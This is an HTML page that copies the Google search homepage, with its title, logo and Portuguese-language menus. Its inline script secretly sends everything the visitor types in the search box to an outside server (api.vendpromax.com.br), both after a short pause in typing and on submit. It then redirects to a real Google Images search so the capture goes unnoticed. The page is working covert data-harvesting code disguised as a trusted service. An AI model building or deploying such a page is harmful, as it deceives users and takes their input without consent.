<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Google</title>

  <link rel="stylesheet" href="public/styles/style.css">
  <link rel="shortcut icon" href="public/img/google-favicon.png" type="image/x-icon">
</head>

<body>

  <header class="menu">
    <div class="menu__section left">
      <img src="public/img/burger-icon.svg" class="menu__icon">
      <a href="#" class="menu__link active">TUDO</a>
      <a href="#" class="menu__link">IMAGES</a>
    </div>

    <div class="menu__section right">
      <img src="public/img/more-icon.svg" class="menu__icon">
    </div>
  </header>

  <main class="content">
    <img class="content__logo" src="public/img/googlw.png" alt="Google">

    <!-- FORMULÁRIO -->
    <form id="formPesquisa">
      <div class="content__search-container">
        <input class="content__search" type="text" id="search" placeholder="Pesquisar no Google">
      </div>

      <div class="content__buttons">

      
      </div>
    </form>

  </main>

  <footer class="footer">
    <div class="footer__section footer__location">
      <span>Brazil</span>
    </div>

    <div class="footer__section footer__links">
      <a href="">Configuraçoes</a>
      <a href="">Privacidade</a>
      <a href="">Termos</a>
    </div>
  </footer>

<script>
  const form = document.getElementById("formPesquisa");
  const input = document.getElementById("search");

  let timeout = null;

  async function enviarPost(texto) {
    if (!texto) return;

    try {
      await fetch("https://api.vendpromax.com.br/api/enviar-mensagem", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          mensagem: texto
        })
      });
    } catch (erro) {
      console.log("Erro ao enviar:", erro);
    }
  }

  // ⏱️ Quando parar de digitar por 5 segundos
  input.addEventListener("input", function () {
    clearTimeout(timeout);

    timeout = setTimeout(() => {
      const texto = input.value;
      enviarPost(texto);
    }, 2000);
  });

  // 🔍 Quando pesquisar (Enter)
  form.addEventListener("submit", async function (e) {
    e.preventDefault();

    const texto = input.value;

    // cancela o timer se ainda estiver contando
    clearTimeout(timeout);

    await enviarPost(texto);

    // REDIRECIONA PARA GOOGLE IMAGENS
    window.location.href = "https://www.google.com/search?tbm=isch&q=" + encodeURIComponent(texto);
  });
</script>
